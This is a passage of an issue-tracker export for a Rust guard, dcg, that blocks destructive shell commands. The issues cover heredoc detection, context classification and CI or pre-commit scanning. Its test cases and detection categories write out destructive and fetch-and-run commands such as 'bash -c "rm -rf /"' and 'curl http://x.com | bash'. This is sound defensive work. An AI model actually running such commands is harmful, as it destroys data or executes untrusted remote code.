tests.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:49:26.918414721-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:49:26.918414721-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.3","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T20:56:04.621135514-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.4","title":"Pre-commit integration for dcg scan (staged)","description":"## Objective\n\nMake it easy for a team to adopt `dcg scan` locally by providing a first-class pre-commit integration path.\n\n## Background\n\n\"You should run dcg scan\" is not enough. Adoption happens when:\n\n- installation is one command\n- failures are actionable\n- teams can choose warn-first rollout\n\n## Proposed UX\n\n### The core command\n\n- `dcg scan --staged`\n\n### Installation helpers\n\nPick one (or more) pragmatic options:\n\n1. `dcg install-pre-commit` (writes `.git/hooks/pre-commit`)\n2. `dcg print-pre-commit-config` (prints snippets for popular managers)\n\nWe should not assume any specific manager.\n\n### Configuration\n\n- optionally read `.dcg/hooks.toml` for:\n  - scan globs\n  - excludes\n  - fail-on policy\n  - max sizes\n\n## Safety constraints\n\n- Default policy should be conservative:\n  - `fail_on = error` (high-confidence catastrophic rules)\n  - `warning` findings do not block commits by default\n\n## Tests\n\n- Unit test that the generated `.git/hooks/pre-commit` script is correct (string snapshot is fine).\n- E2E test (shell script) that runs `dcg scan --staged` on a small fixture repo and verifies expected behavior.\n\n## Acceptance criteria\n\n- A user can run one command and have pre-commit scanning enabled.\n- The hook can be installed idempotently.\n- Documentation exists in README or `dcg scan --help` output.\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T20:49:44.718141247-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:49:44.718141247-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.4","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T20:56:09.84683307-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.5","title":"CI integration for dcg scan (PR diff scanning + PR summary)","description":"## Objective\n\nProvide a \"team-wide\" safety net by running `dcg scan` in CI for pull requests.\n\n## Background\n\nLocal hooks are not always installed or are bypassed (`--no-verify`). CI is where:\n\n- the org can enforce safety rules\n- results can be reviewed centrally\n- rollouts can start in warn-only mode (avoid blocking velocity)\n\n## Proposed MVP (GitHub Actions)\n\n### 1) Workflow snippet (no marketplace action yet)\n\n- A documented GitHub Actions workflow that:\n  - checks out full history (diff computation)\n  - builds `dcg` (or downloads release artifact later)\n  - runs `dcg scan --git-diff \u003cbase\u003e...HEAD --format json --fail-on error`\n  - uploads the JSON artifact\n\n### 2) Human-readable PR summary\n\n- Render a concise Markdown summary to the job log (and optionally as a PR comment):\n  - top N findings, grouped by file\n  - per finding: line, extracted command (truncated), rule id, reason, suggestion\n  - totals by severity (error/warn/info)\n\n### 3) Rollout model\n\n- Default recommendation:\n  - start with `--fail-on error` only\n  - treat warnings as advisory for 1-2 weeks\n  - tighten after allowlists are created\n\n## Output requirements\n\n- JSON schema must be stable:\n  - include `file`, `line`, `extractor_id`, `extracted_command`, `decision`, `rule_id`, `reason`, `suggestion?`\n- CI mode should have deterministic ordering.\n\n## Security/privacy\n\n- Provide a `--redact` option (or config) for commands that might contain secrets.\n- CI should avoid printing entire extracted commands if they are very long.\n\n## Acceptance criteria\n\n- `dcg scan --git-diff ...` handles empty diffs cleanly (0 findings, exit 0).\n- A workflow snippet exists in docs or templates and is proven to run in this repo.\n- When errors exist, CI fails with an actionable summary.\n- When warnings exist (and `--fail-on error`), CI passes but prints the warnings clearly.\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T20:56:31.299265569-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:56:31.299265569-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.5","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T20:56:40.548508411-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-t1rx","title":"Implement Tier 1 regex heredoc detector with RegexSet","description":"# Tier 1: Fast Regex Heredoc Detection\n\n## Objective\n\nImplement the fast-path heredoc detector using Rust's `regex` crate with RegexSet for multi-pattern matching.\n\n## Why RegexSet?\n\nThe `regex` crate's RegexSet allows matching against multiple patterns simultaneously with:\n- Aho-Corasick algorithm for literal prefixes\n- SIMD acceleration (AVX2, SSE4.2)\n- Single pass through input\n- O(n) guaranteed time complexity\n\n## Patterns to Implement\n\n```rust\nstatic HEREDOC_PATTERNS: LazyLock\u003cRegexSet\u003e = LazyLock::new(|| {\n    RegexSet::new([\n        // Bash heredocs\n        r\"\u003c\u003c-?\\s*['\\\"]?\\w+['\\\"]?\",   // \u003c\u003cEOF, \u003c\u003c'EOF', \u003c\u003c-EOF\n        r\"\u003c\u003c\u003c\",                          // Here-strings\n        \n        // Inline script flags  \n        r\"\\b(python3?|python)\\s+-[ce]\\s\",\n        r\"\\b(ruby|irb)\\s+-e\\s\",\n        r\"\\bperl\\s+-[eE]\\s\",\n        r\"\\bnode\\s+-[ep]\\s\",\n        r\"\\b(sh|bash|zsh|fish)\\s+-c\\s\",\n        \n        // Pipe to interpreter\n        r\"\\|\\s*(python3?|ruby|perl|node|sh|bash)\\b\",\n        r\"\\|\\s*xargs\\s\",\n    ]).expect(\"heredoc patterns compile\")\n});\n```\n\n## API\n\n```rust\n/// Check if command might contain heredoc/inline script\n/// Returns true if ANY pattern matches (fast path triggers Tier 2)\npub fn might_contain_heredoc(cmd: \u0026str) -\u003e bool;\n\n/// Get which patterns matched (for debugging/logging)\npub fn matched_heredoc_patterns(cmd: \u0026str) -\u003e Vec\u003cusize\u003e;\n```\n\n## Performance Target\n\n- \u003c 10 microseconds for typical commands\n- Zero allocations on non-match path\n- Must have ZERO false negatives (can have false positives)\n\n## Test Cases\n\n### Must Match (true positives)\n- `python3 \u003c\u003c 'EOF'\\nprint('hi')\\nEOF`\n- `bash -c 'echo hello'`\n- `node -e \"console.log(1)\"`\n- `curl http://x.com | bash`\n- `cat \u003c\u003c EOF | python3`\n\n### Must NOT Match (true negatives)  \n- `git status`\n- `ls -la`\n- `cargo build`\n- `echo \"hello world\"`\n\n### May Match (acceptable false positives)\n- `grep -e pattern file` (has -e but not dangerous)\n- `echo \"\u003c\u003cEOF\"` (string contains heredoc marker)\n\n## Dependencies\n\n- regex = \"1.10\" (add to Cargo.toml)\n- Depends on: Two-tier architecture design (2ta)","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-t1rx","depends_on_id":"git_safety_guard-2ta","type":"blocks","created_at":"2026-01-07T19:28:32.034477208-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-t8x","title":"Epic: False Positive Immunity (Execution Context)","description":"# Epic: False Positive Immunity (Execution Context)\n\n## Why this epic exists\n\nA destructive-command guard must be *trusted*. Repeated false positives destroy velocity and lead users to disable the guard entirely.\n\nThe core failure mode is **context blindness**: matching dangerous substrings in places where they are clearly *data*, not *executed code*.\n\nExamples that must be allowed:\n\n- `bd create --description=\"This pattern blocks rm -rf\"`\n- `git commit -m \"Fix git reset --hard detection\"`\n- `echo \"example: git push --force\"`\n- `rg -n \"rm -rf\" src/main.rs`\n\nCurrently, a purely regex-based guard will often match `rm -rf` (or similar) inside quoted strings and block legitimate documentation/testing work.\n\n## Key idea\n\nIntroduce an **Execution Context layer** that classifies which parts of the command line are actually executed vs merely data.\n\nThen, apply destructive patterns only to executable contexts:\n\n- Executed command words and arguments\n- Pipe targets (right side of `|`)\n- Command substitution (`$(...)`, backticks)\n- Inline interpreter strings (`bash -c`, `python -c`, `node -e`, etc.)\n- Heredoc bodies (handled by the heredoc epic)\n\n…and **skip** matching for clearly data-only contexts:\n\n- Option values for known “documentation/metadata” commands (Beads `bd`, git commit messages, etc.)\n- Grep/Ripgrep pattern arguments\n- Echo/printf arguments\n\n## Goals\n\n1. **Dramatically reduce false positives** for doc/test workflows while preserving true-positive blocks for real execution.\n2. **Keep performance high:** the non-risky path should stay microseconds.\n3. **Provide explainability hooks:** when a command is allowed due to data-context detection, we should be able to explain why (for debugging).\n\n## Architectural constraints\n\n- This layer runs before pack regex evaluation and before AST/heredoc scanning.\n- It must be conservative: if context is ambiguous, treat as executable or escalate to deeper analysis, but avoid blocking obvious documentation strings.\n\n## Acceptance criteria (epic-level)\n\n- The examples in “Why this epic exists” are allowed.\n- Real executions are still blocked:\n  - `bash -c \"rm -rf /\"`\n  - `echo hi | bash -c \"rm -rf /\"`\n  - `python -c \"import os; os.system('rm -rf /')\"`\n- Context classification has regression tests for:\n  - quoting (single/double/escaped)\n  - pipes\n  - command substitution\n  - xargs\n  - interpreter flags (-c/-e/-p)\n\n## Notes for future self\n\n- If we add a “warn mode” or confidence scoring, this epic provides the context signals.\n- Don’t overfit to specific tools; start with a minimal safe-string-arg registry and expand based on real false positives.\n","status":"open","priority":1,"issue_type":"epic","created_at":"2026-01-07T19:57:23.162019558-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:57:23.162019558-05:00"}
{"id":"git_safety_guard-t8x.1","title":"Define Safe String-Argument Registry v1 (commands + flags)","description":"## Objective\n\nCreate a **versioned** registry of commands whose arguments are predominantly *data*, not code, so we can suppress false positives without compromising safety.\n\n## Background\n\nMany developer workflows involve writing *about* dangerous commands:\n\n- issue trackers (`bd create --description=...`)\n- git commit/tag messages (`git commit -m ...`)\n- search tools (`rg -e \"rm -rf\" ...`)\n- printing examples (`echo \"git reset --hard\"`)\n\nWithout recognizing these contexts, regex matching will cause velocity-destroying false positives.\n\n## Scope (v1)\n\nStart with a small, high-value registry:\n\n### Always-data commands\n\n- `echo`, `printf`\n\n### Beads CLI\n\n- `bd create`: `--description`, `--title`, `--notes`\n- `bd update`: `--description`, `--title`, `--notes`\n\n### Git messages\n\n- `git commit -m`, `git commit --message`\n- `git tag -m`, `git tag --message`\n- `git notes add -m`\n\n### Search tools\n\n- `grep` pattern args (`-e`, `--regexp`, `-F`, `--fixed-strings`)\n- `rg` pattern args (`-e`, `--regexp`, `--fixed-strings`)\n\n### Optional candidates (add only with tests)\n\n- `sed` scripts in `-e` (can be code; treat as code, not data)\n- `awk` programs (code; treat as code)\n\n## Design requirements\n\n- Registry must be **explicit and test-driven**.\n- Registry must be conservative: only suppress matching where we are confident strings are not executed.\n- Provide a way to extend the registry via config in the future (but do not over-engineer).\n\n## Acceptance criteria\n\n- Add unit tests for each registry entry demonstrating at least one previously false-positive case that is now allowed.\n- Add at least one counterexample test per category to ensure we do not suppress *real* execution (e.g., `bash -c \"rm -rf /\"` must still be evaluated).\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:02:56.784418941-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:02:56.784418941-05:00","dependencies":[{"issue_id":"git_safety_guard-t8x.1","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T20:02:56.795312367-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-t8x.2","title":"Implement execution-context classification (pipes, subst, quoting)","description":"## Objective\n\nImplement a fast execution-context classifier that identifies which parts of a command line are executed vs data.\n\n## Background\n\nA safe-string registry alone is insufficient. We must correctly classify contexts such as:\n\n- pipes: `echo hi | bash -c \"...\"`\n- command substitution: `$(rm -rf /tmp)`\n- backticks: `` `rm -rf /tmp` ``\n- xargs: `printf '%s\\n' rm -rf / | xargs ...`\n- inline interpreter flags: `bash -c`, `python -c`, `node -e`, etc.\n\nThese contexts are **executable** even if they appear inside quotes.\n\n## Approach\n\n### Phase 1 (minimal, high ROI)\n\n- Tokenize the shell command line with a small, purpose-built tokenizer:\n  - recognize single quotes, double quotes, backslash escapes\n  - recognize operators: `|`, `\u0026\u0026`, `||`, `;`, `$(...)`, backticks\n  - identify the first word of each pipeline segment as the executed command\n\n### Phase 2 (harder cases)\n\n- Recognize `xargs` invocation patterns where subsequent tokens become executed commands.\n- Recognize `env VAR=... cmd` wrappers.\n- Recognize `sudo` prefix.\n\n### Phase 3 (optional)\n\n- Replace tokenizer with tree-sitter-bash if maintenance burden becomes high.\n\n## Output model\n\nProduce a lightweight structure such as:\n\n- `Vec\u003cSpan\u003e` where `Span { kind: Executed | Data | InlineCode | HeredocBody | Unknown, byte_range }`\n\nThe decision engine applies pack regexes only to `Executed`/`InlineCode`/`HeredocBody` (and never to pure `Data`).\n\n## Safety rule\n\nIf classification is ambiguous, prefer **not** suppressing matching (treat as executable or run deeper analysis).\n\n## Acceptance criteria\n\n- Unit tests cover:\n  - quoting and escaping\n  - pipes and separators\n  - command substitution and backticks\n  - bash/python/node inline code flags\n- Demonstrate the classifier allows documentation strings but still blocks real executions.\n- Performance: classification adds \u003c ~100µs to typical commands.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:03:13.621823546-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:03:13.621823546-05:00","dependencies":[{"issue_id":"git_safety_guard-t8x.2","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T20:03:13.623130597-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-t8x.3","title":"E2E regression: false positives vs real execution contexts","description":"## Objective\n\nExpand end-to-end coverage to ensure the execution-context layer prevents false positives without introducing false negatives.\n\n## Scope\n\nAdd E2E cases for:\n\n### Must ALLOW (data contexts)\n\n- `bd create --description=\"Pattern blocks rm -rf\"`\n- `bd update \u003cid\u003e --notes \"example: git reset --hard\"`\n- `git commit -m \"Fix git push --force detection\"`\n- `git tag -m \"Document rm -rf\" v1.2.3`\n- `echo \"example: kubectl delete namespace prod\"`\n- `rg -n \"rm -rf\" src/main.rs`\n- `grep -e \"DROP TABLE\" schema.sql`\n\n### Must BLOCK (executed contexts)\n\n- `bash -c \"rm -rf /\"`\n- `echo hi | bash -c \"rm -rf /\"`\n- `python -c \"import os; os.system('rm -rf /')\"`\n- `node -e \"require('child_process').execSync('rm -rf /')\"`\n- `echo $(rm -rf /tmp/foo)` (command substitution)\n- ``echo `rm -rf /tmp/foo` `` (backticks)\n\n### Edge cases\n\n- mixed quoting and escapes\n- `sudo` prefix\n- `env VAR=... bash -c ...`\n\n## Logging requirements\n\n- E2E runner must print for each test:\n  - description\n  - command (possibly truncated)\n  - expected allow/block\n  - actual decision\n  - if blocked: pack_id/pattern_name (once available)\n\n## Acceptance criteria\n\n- E2E suite runs in CI and produces a clear failure summary listing failed cases.\n- At least one test proves that docs strings containing dangerous substrings are allowed.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:03:29.812660747-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:03:29.812660747-05:00","dependencies":[{"issue_id":"git_safety_guard-t8x.3","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T20:03:29.813900562-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-t8x.3","depends_on_id":"git_safety_guard-99e.5","type":"blocks","created_at":"2026-01-07T20:09:05.564047374-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-tlog","title":"Add detailed tracing and logging for heredoc detection","description":"# Tracing and Logging Implementation\n\n## Objective\n\nAdd comprehensive tracing using the `tracing` crate to enable debugging and monitoring of heredoc detection.\n\n## Dependencies to Add\n\n```toml\n[dependencies]\ntracing = \"0.1\"\ntracing-subscriber = { version = \"0.3\", features = [\"env-filter\"] }\n```\n\n## Log Levels\n\n- **ERROR**: Parsing failures, timeout exceeded\n- **WARN**: Fallback triggered, unknown language\n- **INFO**: Heredoc detected, command blocked/allowed\n- **DEBUG**: Pattern matches, timing details\n- **TRACE**: Full command text, AST details\n\n## Instrumentation Points\n\n### 1. Main Check Flow\n\n```rust\n#[tracing::instrument(skip(cmd), fields(cmd_len = cmd.len()))]\npub fn check_command(cmd: \u0026str) -\u003e CheckResult {\n    let start = Instant::now();\n    \n    // Quick reject\n    if global_quick_reject(cmd) {\n        tracing::trace!(\"quick_reject: no relevant keywords\");\n        return CheckResult::allowed();\n    }\n    \n    // Heredoc detection\n    if might_contain_heredoc(cmd) {\n        tracing::debug!(\"heredoc_detected: triggering Tier 2 analysis\");\n        if let Some(result) = check_heredoc(cmd) {\n            tracing::info!(\n                blocked = result.blocked,\n                reason = ?result.reason,\n                elapsed_us = start.elapsed().as_micros(),\n                \"heredoc_check_complete\"\n            );\n            return result;\n        }\n    }\n    \n    // Pattern matching...\n}\n```\n\n### 2. Heredoc Analysis\n\n```rust\n#[tracing::instrument(skip(cmd))]\nfn check_heredoc(cmd: \u0026str) -\u003e Option\u003cCheckResult\u003e {\n    let extraction_start = Instant::now();\n    let heredoc = extract_heredoc(cmd)?;\n    tracing::debug!(\n        extraction_us = extraction_start.elapsed().as_micros(),\n        content_len = heredoc.content.len(),\n        \"heredoc_extracted\"\n    );\n    \n    let lang = detect_language(\u0026heredoc);\n    tracing::debug!(language = ?lang, \"language_detected\");\n    \n    let parse_start = Instant::now();\n    let matches = match_patterns(\u0026heredoc.content, lang);\n    tracing::debug!(\n        parse_us = parse_start.elapsed().as_micros(),\n        match_count = matches.len(),\n        \"patterns_checked\"\n    );\n    \n    // ...\n}\n```\n\n### 3. Error Handling\n\n```rust\nmatch parse_with_ast_grep(\u0026content, lang) {\n    Ok(ast) =\u003e { /* ... */ }\n    Err(e) =\u003e {\n        tracing::warn!(\n            error = %e,\n            language = ?lang,\n            \"ast_parse_failed: falling back to allow\"\n        );\n        return None;  // Fail-open\n    }\n}\n```\n\n## Environment Variable Control\n\n```bash\n# Enable all heredoc tracing\nRUST_LOG=dcg::heredoc=debug dcg check\n\n# Enable timing info only\nRUST_LOG=dcg=info dcg check\n\n# Full trace (very verbose)\nRUST_LOG=dcg=trace dcg check\n```\n\n## JSON Structured Logging\n\nFor machine parsing:\n\n```rust\ntracing_subscriber::fmt()\n    .json()\n    .with_env_filter(EnvFilter::from_default_env())\n    .init();\n```\n\nOutput:\n```json\n{\"timestamp\":\"2026-01-07T19:30:45Z\",\"level\":\"DEBUG\",\"target\":\"dcg::heredoc\",\"message\":\"heredoc_detected\",\"cmd_len\":156,\"tier\":1}\n{\"timestamp\":\"2026-01-07T19:30:45Z\",\"level\":\"DEBUG\",\"target\":\"dcg::heredoc\",\"message\":\"language_detected\",\"language\":\"Python\"}\n{\"timestamp\":\"2026-01-07T19:30:45Z\",\"level\":\"INFO\",\"target\":\"dcg::heredoc\",\"message\":\"command_blocked\",\"reason\":\"os.system with shell command\",\"elapsed_us\":1234}\n```\n\n## Performance Impact\n\n- Logging disabled: Zero overhead (tracing uses static dispatch)\n- INFO level: \u003c 1μs per log call\n- DEBUG level: \u003c 5μs per log call\n- TRACE level: Variable (includes data serialization)\n\n## Test Verification\n\nAdd tests that verify logging output:\n\n```rust\n#[test]\nfn test_heredoc_logging() {\n    let (writer, handle) = tracing_test::subscriber();\n    tracing::subscriber::with_default(writer, || {\n        check_command(\"python3 \u003c\u003c 'EOF'\\nimport os\\nos.system('rm -rf /')\\nEOF\");\n    });\n    \n    let logs = handle.into_string();\n    assert!(logs.contains(\"heredoc_detected\"));\n    assert!(logs.contains(\"language_detected\"));\n    assert!(logs.contains(\"Python\"));\n}","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-tlog","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:33.00690866-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-tlog","depends_on_id":"git_safety_guard-1gt.4","type":"relates-to","created_at":"2026-01-07T20:11:15.436832681-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-uau","title":"Define Bash/Shell destructive patterns for heredoc scanning","description":"## Objective\n\nDefine ast-grep/tree-sitter patterns to detect dangerous Bash/Shell constructs within heredoc bodies.\n\n## Why This Matters\n\nBash heredocs are the most common attack vector because:\n1. bash -c, sh -c are extremely common command forms\n2. Shell scripts can invoke ANY system command\n3. Existing dcg regex patterns already target many shell commands - we need equivalent AST patterns\n\n## Pattern Categories to Define\n\n### File/Directory Destruction\n- recursive forced removal patterns\n- rmdir on critical directories\n- find with delete patterns\n- Wildcards in destructive contexts\n\n### Git Destructive Operations\n- hard reset patterns\n- forced clean patterns\n- force push to protected branches\n- force branch deletion\n\n### Permission/Ownership Changes\n- chmod 777 on system paths\n- chown root or changing critical file ownership\n- setfacl manipulations\n\n### System Administration\n- mkfs, fdisk, dd commands on devices\n- service/systemctl stop on critical services\n- kill -9 on system processes\n- shutdown, reboot, halt\n\n### Data Exfiltration Indicators\n- curl/wget piped to shell\n- base64 encoding of sensitive files\n- tar/zip of home directories or /etc\n\n## Implementation Notes\n\nShell parsing is complex due to:\n- Quoting rules (single, double, command substitution)\n- Variable expansion\n- Command substitution\n- Heredocs within heredocs\n- Arrays and special variables\n\nStart with tree-sitter-bash and test each pattern against real shell scripts to validate accuracy.\n\n## Test Cases\n\nEach pattern needs positive tests (should match) and negative tests (should not match) covering:\n- Common benign uses that look similar\n- Quoting variations\n- Variable indirection\n- Command aliasing\n\n## Dependencies\n\n- Pattern library structure design (how patterns are organized)\n- ast-grep invocation layer (how to run ast-grep on content)\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:34:59.51511691-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:35:04.976948155-05:00","dependencies":[{"issue_id":"git_safety_guard-uau","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:35:11.201594037-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-uau","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:35:11.220201218-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-unit","title":"Create comprehensive unit test suite for heredoc detection","description":"# Unit Test Suite for Heredoc Detection\n\n## Objective\n\nCreate thorough unit tests for each component of the heredoc detection system.\n\n## Test Modules\n\n### 1. Tier 1 Regex Tests (`tests/tier1_regex.rs`)\n\n```rust\nmod tier1_regex_tests {\n    use super::*;\n    \n    #[test]\n    fn test_bash_heredoc_variants() {\n        // Standard heredoc\n        assert!(might_contain_heredoc(\"cat \u003c\u003c EOF\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003cEOF\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003c 'EOF'\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003c \\\"EOF\\\"\"));\n        \n        // Indented heredoc\n        assert!(might_contain_heredoc(\"cat \u003c\u003c- EOF\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003c-EOF\"));\n        \n        // Here-string\n        assert!(might_contain_heredoc(\"cat \u003c\u003c\u003c 'hello'\"));\n    }\n    \n    #[test]\n    fn test_inline_script_flags() {\n        // Python\n        assert!(might_contain_heredoc(\"python -c 'print(1)'\"));\n        assert!(might_contain_heredoc(\"python3 -c 'print(1)'\"));\n        assert!(might_contain_heredoc(\"python -e 'print(1)'\")); // -e not valid but we catch\n        \n        // Node.js\n        assert!(might_contain_heredoc(\"node -e 'console.log(1)'\"));\n        assert!(might_contain_heredoc(\"node -p 'process.version'\"));\n        \n        // Ruby\n        assert!(might_contain_heredoc(\"ruby -e 'puts 1'\"));\n        \n        // Perl\n        assert!(might_contain_heredoc(\"perl -e 'print 1'\"));\n        assert!(might_contain_heredoc(\"perl -E 'say 1'\"));\n        \n        // Shell\n        assert!(might_contain_heredoc(\"bash -c 'echo hi'\"));\n        assert!(might_contain_heredoc(\"sh -c 'echo hi'\"));\n        assert!(might_contain_heredoc(\"zsh -c 'echo hi'\"));\n    }\n    \n    #[test]\n    fn test_pipe_to_interpreter() {\n        assert!(might_contain_heredoc(\"curl http://x.com | bash\"));\n        assert!(might_contain_heredoc(\"cat script.py | python3\"));\n        assert!(might_contain_heredoc(\"echo code | node\"));\n    }\n    \n    #[test]\n    fn test_negative_cases() {\n        assert!(!might_contain_heredoc(\"git status\"));\n        assert!(!might_contain_heredoc(\"cargo build\"));\n        assert!(!might_contain_heredoc(\"ls -la\"));\n        assert!(!might_contain_heredoc(\"cat file.txt\"));\n        assert!(!might_contain_heredoc(\"grep pattern file\"));\n    }\n}\n```\n\n### 2. Heredoc Extraction Tests (`tests/extraction.rs`)\n\n```rust\nmod extraction_tests {\n    #[test]\n    fn test_extract_simple_heredoc() {\n        let cmd = \"python3 \u003c\u003c 'EOF'\\nprint('hello')\\nEOF\";\n        let heredoc = extract_heredoc(cmd).unwrap();\n        assert_eq!(heredoc.content, \"print('hello')\\n\");\n        assert_eq!(heredoc.delimiter, \"EOF\");\n        assert!(heredoc.quoted);\n    }\n    \n    #[test]\n    fn test_extract_indented_heredoc() {\n        let cmd = \"bash \u003c\u003c- 'END'\\n\\techo hello\\n\\techo world\\n\\tEND\";\n        let heredoc = extract_heredoc(cmd).unwrap();\n        // \u003c\u003c- strips leading tabs\n        assert_eq!(heredoc.content, \"echo hello\\necho world\\n\");\n    }\n    \n    #[test]\n    fn test_extract_inline_script() {\n        let cmd = \"python3 -c 'import os; os.system(\\\"ls\\\")'\";\n        let heredoc = extract_heredoc(cmd).unwrap();\n        assert_eq!(heredoc.content, \"import os; os.system(\\\"ls\\\")\");\n    }\n}\n```\n\n### 3. Language Detection Tests (`tests/language_detection.rs`)\n\n```rust\nmod language_detection_tests {\n    #[test]\n    fn test_detect_from_command() {\n        assert_eq!(detect_language_from_cmd(\"python3 -c\"), Language::Python);\n        assert_eq!(detect_language_from_cmd(\"node -e\"), Language::JavaScript);\n        assert_eq!(detect_language_from_cmd(\"ruby -e\"), Language::Ruby);\n        assert_eq!(detect_language_from_cmd(\"perl -e\"), Language::Perl);\n        assert_eq!(detect_language_from_cmd(\"bash -c\"), Language::Bash);\n    }\n    \n    #[test]\n    fn test_detect_from_shebang() {\n        assert_eq!(detect_language_from_content(\"#!/usr/bin/env python3\\n\"), Language::Python);\n        assert_eq!(detect_language_from_content(\"#!/bin/bash\\n\"), Language::Bash);\n        assert_eq!(detect_language_from_content(\"#!/usr/bin/node\\n\"), Language::JavaScript);\n    }\n    \n    #[test]\n    fn test_detect_from_content_heuristics() {\n        assert_eq!(detect_language_from_content(\"import os\\n\"), Language::Python);\n        assert_eq!(detect_language_from_content(\"require('fs')\\n\"), Language::JavaScript);\n        assert_eq!(detect_language_from_content(\"use strict;\\n\"), Language::Perl);\n    }\n}\n```\n\n### 4. Pattern Matching Tests (`tests/patterns.rs`)\n\nOne submodule per language with comprehensive tests.\n\n### 5. False Positive Tests (`tests/false_positives.rs`)\n\n```rust\nmod false_positive_tests {\n    #[test]\n    fn test_documentation_allowed() {\n        // These should NOT be blocked\n        assert!(check_command(\"bd create --description='blocks rm -rf'\").is_allowed());\n        assert!(check_command(\"git commit -m 'fix rm -rf detection'\").is_allowed());\n        assert!(check_command(\"grep 'rm -rf' src/\").is_allowed());\n    }\n}\n```\n\n## Coverage Requirements\n\n- Line coverage: \u003e 90%\n- Branch coverage: \u003e 85%\n- All public functions have tests\n- All error paths tested","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-t1rx","type":"blocks","created_at":"2026-01-07T19:28:33.163885724-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-49s","type":"blocks","created_at":"2026-01-07T19:28:33.346249627-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T19:28:33.507729581-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T19:28:33.663971771-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-y4j","title":"Implement heredoc content extraction","description":"# Implement Heredoc Content Extraction\n\n## Objective\nExtract the actual script content from detected heredocs for scanning.\n\n## Background\nOnce we detect a heredoc is present, we need to accurately extract its content. This is more complex than detection because we must:\n1. Identify the delimiter\n2. Find the matching end delimiter\n3. Handle quoting and expansion rules\n4. Preserve or strip indentation as appropriate\n\n## Implementation Details\n\n### Heredoc Extraction Logic\n\n```rust\npub struct HeredocContent {\n    /// The extracted script content\n    pub content: String,\n    /// Detected or inferred language\n    pub language: Option\u003cLanguage\u003e,\n    /// Original delimiter used\n    pub delimiter: String,\n    /// Whether the delimiter was quoted (no expansion)\n    pub quoted: bool,\n    /// Byte offset in original command\n    pub start_offset: usize,\n    pub end_offset: usize,\n}\n\npub fn extract_heredoc(cmd: \u0026str) -\u003e Option\u003cHeredocContent\u003e {\n    // 1. Find heredoc start pattern\n    // 2. Extract delimiter (handle quoting)\n    // 3. Find matching end delimiter\n    // 4. Extract content between\n    // 5. Apply indentation rules for \u003c\u003c-\n}\n```\n\n### Delimiter Handling\n- Unquoted: EOF, END, SCRIPT\n- Single-quoted: 'EOF', 'END'\n- Double-quoted: \"EOF\", \"END\"\n- Backtick-quoted: \\`EOF\\` (rare)\n\n### Indentation Rules\n- Standard \u003c\u003c: preserve all indentation\n- Tab-stripped \u003c\u003c-: remove leading tabs from content AND delimiter\n- Zsh \u003c\u003c~: remove common leading whitespace\n\n### Edge Cases\n- Multiple heredocs in one command\n- Nested command substitution containing heredocs\n- Empty heredocs\n- Heredocs with embedded quotes\n- Heredocs that span multiple lines of piped commands\n\n### Inline Script Extraction (Non-Heredoc)\nAlso handle -c/-e style inline scripts:\n```\npython -c \"import os; os.system('...')\"\nnode -e 